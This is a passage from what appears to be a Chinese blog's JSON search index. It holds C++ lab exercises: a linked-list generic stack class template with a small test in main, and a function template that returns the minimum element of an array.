Stack\u0026lt;int\u0026gt; stack; // 实例化一个保存int型元素的栈 for (int i = 1; i \u0026lt; 9; i++) // 向栈中压入8个元素 stack.push(i); while (!stack.isEmpty()) { // 栈不为空时循环 cout \u0026lt;\u0026lt; stack.getTop() \u0026lt;\u0026lt; \u0026#34; \u0026#34;; // 显示栈顶元素 stack.pop(); // 弹出栈顶元素 } return 0; } //genericStack.h template \u0026lt;typename ElementType\u0026gt; class Stack{ public: Stack() { top = nullptr; } ~Stack() { while(top){ Node *temp = top; top = top-\u0026gt;next; delete temp; } } void push(ElementType obj) { Node *newNode = new Node{obj, top}; top = newNode; } //将新元素入栈 void pop() { if(!isEmpty()){ Node *temp = top; top = top-\u0026gt;next; delete temp; } } //将栈顶元素出栈 ElementType getTop() const { return top-\u0026gt;element; } //返回栈顶元素 bool isEmpty() const { return top==nullptr; } //判断栈是否为空 private: struct Node{ // 栈结点类型 ElementType element; // 结点中存放的元素 Node *next;\t// 指向下一结点的指针 }; Node *top; // 栈顶 }; 1.10.2 函数模板 # /*编写一个求数组中的最小元素的函数模板 T Max(T *a, int n)，其中，a为数组，T 为数组类型，n为数组的长度。 数组的类型可以是int型、double型和string类型。数组中元素个数3≤n≤20。*/ #include\u0026lt;iostream\u0026gt; #include\u0026lt;string\u0026gt; using namespace std; template \u0026lt;typename T\u0026gt; T Min(T *a, int n) { T min = a[0]; for(int i=0;i\u0026lt;n;i++) { if(min \u0026gt; a[i]) min = a[i]; } return min; } 1.10.3 stl 的基础使用 # 略\n","date":"June 30, 2023","permalink":"/posts/c++/homework/c++%E5%AE%9E%E9%AA%8C%E9%A2%98/","section":"Posts","summary":"1.基础知识(🐶都不看好吧) # 忙里偷闲整理一下上学期","title":"C++实验"},{"content":"","date":"June 30, 2023","permalink":"/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"Tags","summary":"","title":"基础知识"},{"content":"","date":"January 1, 1","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"}]